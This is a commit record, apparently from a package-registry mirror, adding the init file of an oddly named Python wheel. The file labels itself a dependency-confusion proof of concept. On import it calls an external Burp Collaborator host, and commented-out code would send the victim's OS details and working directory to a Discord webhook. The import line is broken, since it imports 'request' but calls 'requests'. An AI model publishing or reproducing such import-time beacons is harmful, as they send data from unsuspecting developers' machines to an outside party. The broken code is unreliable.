6749dff63e9fe9d16c2cefe84a37b537605f63cf
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-10-17 06:05:10 +0000

    Add package iufgbewroibgfowiebc/0.0.1/iufgbewroibgfowiebc-0.0.1-py3-none-any.whl

---
+++ packages/iufgbewroibgfowiebc/iufgbewroibgfowiebc-0.0.1-py3-none-any.whl/iufgbewroibgfowiebc/__init__.py
@@ -0,0 +1,21 @@
+# python package dependency confiuse vulnerability POC 
+# name: techghoshal
+# e-mail: techghoshal@gmail.com
+# Impact this vulnerability: Remote code execution(RCE)
+
+
+import request
+#from discord import SyncWebhook
+#import os
+
+## canarytokens_url OR burp collaborator URL
+requests.get("http://gvf76n4hkwjaa2fv4648put27tdk1bp0.oastify.com")
+
+## Send target system info to your discord server 
+#webhook = SyncWebhook.from_url("<discord_webhook_url>")
+
+#osname =  os.uname()
+#cwd = os.getcwd()
+
+#webhook.send(f"OS-Info: {osname}")
+#webhook.send(f"Current-DIR: {cwd}")
